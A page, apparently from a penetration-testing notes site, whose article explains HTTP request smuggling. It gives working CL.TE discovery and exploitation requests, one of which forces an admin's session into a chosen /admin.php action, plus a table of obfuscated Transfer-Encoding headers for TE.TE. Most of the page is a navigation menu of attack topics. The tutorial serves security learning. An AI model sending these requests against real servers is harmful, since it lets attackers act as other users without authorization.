+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/special-privileges/alwaysinstallelevated/" class="">
+      Always Install Elevated</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/special-privileges/dnsadmins/" class="">
+      DNS Admins</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/special-privileges/event-log-readers/" class="">
+      Event Log Readers</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/special-privileges/print-operators/" class="">
+      Print Operators</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/special-privileges/sebackupprivilege/" class="">
+      Se Backup Privilege</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/special-privileges/sedebugprivilege/" class="">
+      Se Debug Privilege</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/special-privileges/seimpersonateprivilege/" class="">
+      Se Impersonate Privilege</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/special-privileges/serestoreprivilege/" class="">
+      Se Restore Privilege</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/special-privileges/server-operators/" class="">
+      Server Operators</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/special-privileges/setakeownershipprivilege/" class="">
+      Se Take Ownership Privilege</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/credential-looting/" class="">
+      Credential Looting</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/dpapi/" class="">
+      Dpapi</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/enumeration/" class="">
+      Enumeration</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/printnightmare/" class="">
+      Print Nightmare</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/uac-bypass/" class="">
+      Uac Bypass</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/user-interactions/" class="">
+      User Interactions</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-ad0adecc90d787090f7f3f2c668562f3" class="toggle"  />
+    <label for="section-ad0adecc90d787090f7f3f2c668562f3" class="flex">
+      <a role="button" class="">
+        07. Credential Looting</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/07.-credential-looting/dump-lsass/" class="">
+      Dump Lsass</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/07.-credential-looting/dump-sam/" class="">
+      Dump Sam</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/07.-credential-looting/kerberos-keytab---linux/" class="">
+      Kerberos Keytab Linux</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/07.-credential-looting/kerberos-kirbi---windows/" class="">
+      Kerberos Kirbi Windows</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/07.-credential-looting/laps/" class="">
+      Laps</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/07.-credential-looting/virtual-disks/" class="">
+      Virtual Disks</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-2c02c5639835e2c5e10145947a8080b5" class="toggle"  />
+    <label for="section-2c02c5639835e2c5e10145947a8080b5" class="flex">
+      <a role="button" class="">
+        08. Discovery</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/08.-discovery/network-hosts/" class="">
+      Network Hosts</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/08.-discovery/password-policy/" class="">
+      Password Policy</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/08.-discovery/ping-sweep/" class="">
+      Ping Sweep</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/08.-discovery/user-enumeration/" class="">
+      User Enumeration</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-07686cc097df585dc242bc14dc089ca4" class="toggle"  />
+    <label for="section-07686cc097df585dc242bc14dc089ca4" class="flex">
+      <a role="button" class="">
+        09. Pivoting</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/09.-pivoting/chisel/" class="">
+      Chisel</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/09.-pivoting/dnscat2/" class="">
+      Dnscat2</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/09.-pivoting/ligolo-ng/" class="">
+      Ligolo Ng</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/09.-pivoting/metasploit/" class="">
+      Metasploit</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/09.-pivoting/port-forward/" class="">
+      Port Forward</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/09.-pivoting/ssh/" class="">
+      SSH</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-e1e0aa139ebb047bc9559800a509d69c" class="toggle"  />
+    <label for="section-e1e0aa139ebb047bc9559800a509d69c" class="flex">
+      <a role="button" class="">
+        10. Lateral Movement</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/adcs-attacks/" class="">
+      Adcs Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/bloodhound/" class="">
+      Bloodhound</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/dacl-abuse/" class="">
+      Dacl Abuse</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/dcsync/" class="">
+      Dcsync</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/enumeration/" class="">
+      Enumeration</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/impacket-exec/" class="">
+      Impacket *Exec</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/kerberoasting/" class="">
+      Kerberoasting</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/kerberos/" class="">
+      Kerberos</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/nopac/" class="">
+      No Pac</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/ntlm-relay/" class="">
+      Ntlm Relay</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/password-spray---from-linux/" class="">
+      Password Spray From Linux</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/password-spray---from-windows/" class="">
+      Password Spray From Windows</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/rdp-session-hijacking/" class="">
+      Rdp Session Hijacking</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/relay-potato/" class="">
+      Relay Potato</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/runas/" class="">
+      Runas</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-0bb2b04e93944d81f8c46b09caf99f9f" class="toggle"  />
+    <label for="section-0bb2b04e93944d81f8c46b09caf99f9f" class="flex">
+      <a role="button" class="">
+        File Transfer</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/file-transfer/edge-cases/" class="">
+      Edge Cases</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/file-transfer/encrypted-transfer/" class="">
+      Encrypted Transfer</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/file-transfer/linux-target/" class="">
+      Linux Target</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/file-transfer/nginx/" class="">
+      Nginx</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/file-transfer/rdp/" class="">
+      Rdp</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/file-transfer/windows-target/" class="">
+      Windows Target</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/file-transfer/winrm/" class="">
+      Win Rm</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-27f3a00f046f423a04ef1a6857a1d881" class="toggle"  />
+    <label for="section-27f3a00f046f423a04ef1a6857a1d881" class="flex">
+      <a role="button" class="">
+        Misc</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/misc/interactive-shell/" class="">
+      Interactive Shell</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/misc/python-eval-bypass/" class="">
+      Python Eval Bypass</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/misc/tips-and-setup/" class="">
+      Tips and Setup</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-c4c7affcc57db383fea3db37de311743" class="toggle"  />
+    <label for="section-c4c7affcc57db383fea3db37de311743" class="flex">
+      <a role="button" class="">
+        Password Crack</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/password-crack/hashcat/" class="">
+      Hashcat</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/password-crack/hashid/" class="">
+      Hash ID</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/password-crack/john/" class="">
+      John</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-693d6624a689f7e347a0baca206ef8ad" class="toggle"  />
+    <label for="section-693d6624a689f7e347a0baca206ef8ad" class="flex">
+      <a role="button" class="">
+        Syntax Cheatsheets</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/syntax-cheatsheets/cewl/" class="">
+      Cewl</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/syntax-cheatsheets/metasploit/" class="">
+      Metasploit</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/syntax-cheatsheets/nodejs/" class="">
+      Node Js</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/syntax-cheatsheets/openssl/" class="">
+      Open Ssl</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/syntax-cheatsheets/powershell/" class="">
+      Powershell</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/syntax-cheatsheets/sed/" class="">
+      Sed</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/syntax-cheatsheets/shell-fu/" class="">
+      Shell Fu</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/syntax-cheatsheets/sql-syntax/" class="">
+      SQL Syntax</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/syntax-cheatsheets/sqlmap/" class="">
+      Sqlmap</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+
+  </div>
+</aside>
+ 
+
+    <div class="book-page">
+      <header class="book-header hidden">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/spellbook/icons/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <h3>Request Smuggling</h3>
+
+  <label for="toc-control">
+    
+    <img src="/spellbook/icons/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#discovery">Discovery</a></li>
+    <li><a href="#exploitation">Exploitation</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#discovery-1">Discovery</a></li>
+    <li><a href="#exploitation-1">Exploitation</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#discovery-2">Discovery</a></li>
+    <li><a href="#hold-up-wait-a-minute">Hold up, wait a minute</a></li>
+    <li><a href="#exploitation-2">Exploitation</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#overview-1">Overview</a></li>
+    <li><a href="#h2cl"><code>H2.CL</code></a></li>
+    <li><a href="#h2te"><code>H2.TE</code></a></li>
+    <li><a href="#injections">Injections</a>
+      <ul>
+        <li><a href="#request-header-injection">Request Header Injection</a></li>
+        <li><a href="#header-name-injection">Header Name Injection</a></li>
+        <li><a href="#request-line-injection">Request Line Injection</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown book-article"><p>See <a href="/spellbook/03.-enumeration/80443-tcp-http/http-common-sense/#tcp-socket-reuse">HTTP Common Sense</a> for basics</p>
+<p>This attack is also called desynchronization attack</p>
+<h1 id="overview">Overview<a class="anchor" href="#overview">#</a></h1>
+<p>Since web servers use <code>Content-Length</code>(CL) header or <code>Transfer-Encoding</code>(TE) header to separate each request, we might be able to create a discrepancy between front end server (reverse proxy, web cache, CDN) and back end server</p>
+<p>This is how <code>Content-Length</code> works. HTTP body have <code>hello</code>, which is exactly 5 bytes, so it is the value of the header</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> / <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">127.0.0.1</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/x-www-form-urlencoded</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">5</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>hello</span></span></code></pre></div><p>This is how<code>Transfer-Encoding</code> works. Each chunk is preceded by its size in hexadecimal format on a separate line (0xb = 11). The request is terminated by a chunk of size <code>0</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> / <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">127.0.0.1</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/x-www-form-urlencoded</span>
+</span></span><span style="display:flex;"><span>Transfer-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">chunked</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>b
+</span></span><span style="display:flex;"><span>hello world
+</span></span><span style="display:flex;"><span>0</span></span></code></pre></div><p>Note that the chunk sizes and chunks are separated by the CRLF (<code>\r\n</code>) control sequence. If we display the CRLF characters, the request body looks like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">1d\r\nparam1=HelloWorld&amp;param2=Test\r\n0\r\n\r\n</span></span></span></code></pre></div><p>According to the RFC <a href="https://www.rfc-editor.org/rfc/rfc2616#section-4.4">here</a>, if a request contains both a CL and TE header, the TE header takes precedence, and the CL header should be disregarded. This is how we create a discrepancy between reverse proxy and back end server</p>
+<h1 id="tool">Tool<a class="anchor" href="#tool">#</a></h1>
+<p>Install <a href="https://github.com/PortSwigger/http-request-smuggler">HTTP Request Smuggler</a> from bApp store. See their usage. Too lazy to write&hellip;</p>
+<h1 id="clte"><code>CL.TE</code><a class="anchor" href="#clte">#</a></h1>
+<p>In this example, the reverse proxy does not support <code>TE</code>, so if a request contains both <code>CL</code> and <code>TE</code> header:</p>
+<ul>
+<li>The reverse proxy will (incorrectly) use the CL header to determine the request length</li>
+<li>The web server will (correctly) use the <code>TE</code> header to determine the request length</li>
+</ul>
+<p>As such, this type of HTTP request smuggling vulnerability is called <code>CL.TE</code> vulnerability</p>
+<h2 id="discovery">Discovery<a class="anchor" href="#discovery">#</a></h2>
+<p><strong>First request</strong>:</p>
+<p>We send this request.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> / <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span>Transfer-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">chunked</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>0
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>HELLO</span></span></code></pre></div><p>Reverse proxy will understand this request as</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">HELLO</span></span></span></code></pre></div><p>Meanwhile web server read that as an empty <code>GET</code> request and an unfinished HTTP request, so it waits for more data to finish the request</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#75715e"># First request</span>
+</span></span><span style="display:flex;"><span>GET /admin.php HTTP/1.1
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span>Transfer-Encoding: chunked
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Second request</span>
+</span></span><span style="display:flex;"><span>HELLO</span></span></code></pre></div><p><strong>Second request</strong>:</p>
+<p>Then we send another request immediately after this</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> / <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span>Transfer-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">chunked</span></span></span></code></pre></div><p>The reverse proxy will see a normal empty <code>GET</code> request</p>
+<p>However, the webapp will connect this request with the previous one, resulting in a request like this</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">HELLO</span><span style="color:#a6e22e">GET</span> / <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span>Transfer-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">chunked</span></span></span></code></pre></div><p>Since <code>HELLOGET</code> is obviously not a valid HTTP verb, most of the time the webapp will response with a <code>405 Not Allowed</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">405</span> <span style="color:#a6e22e">Not Allowed</span></span></span></code></pre></div><h2 id="exploitation">Exploitation<a class="anchor" href="#exploitation">#</a></h2>
+<p>We send a request like this.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> / <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">35</span>
+</span></span><span style="display:flex;"><span>Transfer-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">chunked</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>0
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>GET /admin.php?parameter=value HTTP/1.1
+</span></span><span style="display:flex;"><span>Dummy: </span></span></code></pre></div><p>Now if an admin access any page, the webapp will see something like this. The <code>Dummy</code> header is there to invalidate the first line (HTTP verb) of the request.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /admin.php?parameter=value <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Dummy<span style="color:#f92672">:</span> <span style="color:#ae81ff">GET / HTTP/1.1</span>
+</span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">session=abcdefghijklmnopqrstuvwxyz</span></span></span></code></pre></div><p>We successfully forced the admin use to do an action we wanted.</p>
+<h1 id="tete"><code>TE.TE</code><a class="anchor" href="#tete">#</a></h1>
+<p>In this example, both reverse proxy and web server supports <code>TE</code>. However, the reverse proxy does not act according to the specification, so we can make it fall back to <code>CL</code>, and the other one use <code>TE</code></p>
+<p>Effectively, it is similar to <code>CL.TE</code></p>
+<h2 id="discovery-1">Discovery<a class="anchor" href="#discovery-1">#</a></h2>
+<p>To discover <code>TE.TE</code>, we need to trick either the reverse proxy or the web server into ignoring the TE header. Here are a few options we could try to obfuscate the <code>TE</code> header from one of the two systems:</p>
+<table>
+  <thead>
+      <tr>
+          <th>Description</th>
+          <th>Header</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Substring match</td>
+          <td><code>Transfer-Encoding: testchunked</code></td>
+      </tr>
+      <tr>
+          <td>Space in Header name</td>
+          <td><code>Transfer-Encoding : chunked</code></td>
+      </tr>
+      <tr>
+          <td>Horizontal Tab Separator</td>
+          <td><code>Transfer-Encoding:[\x09]chunked</code></td>
+      </tr>
+      <tr>
+          <td>Vertical Tab Separator</td>
+          <td><code>Transfer-Encoding:[\x0b]chunked</code></td>
+      </tr>
+      <tr>
+          <td>Leading space</td>
+          <td><code> Transfer-Encoding: chunked</code></td>
+      </tr>
+  </tbody>
+</table>
+<blockquote class='book-hint '>
+<p><strong>Note:</strong> The sequences <code>[\x09]</code> and <code>[\x0b]</code> are not the literal character sequences used in the obfuscation. Rather they denote the horizontal tab character (ASCII <code>0x09</code>) and vertical tab character (ASCII <code>0x0b</code>).</p>
+</blockquote><p>We send a similar request to <code>CL.TE</code>. However, we have a leading space in the <code>TE</code> header</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> / <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">Transfer-Encoding: chunked</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>0
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>HELLO</span></span></code></pre></div><p>Keep sending the same thing for a few times. If you get a <code>405</code>, it&rsquo;s vulnerable. If you get nothing, try something else instead of leading space</p>
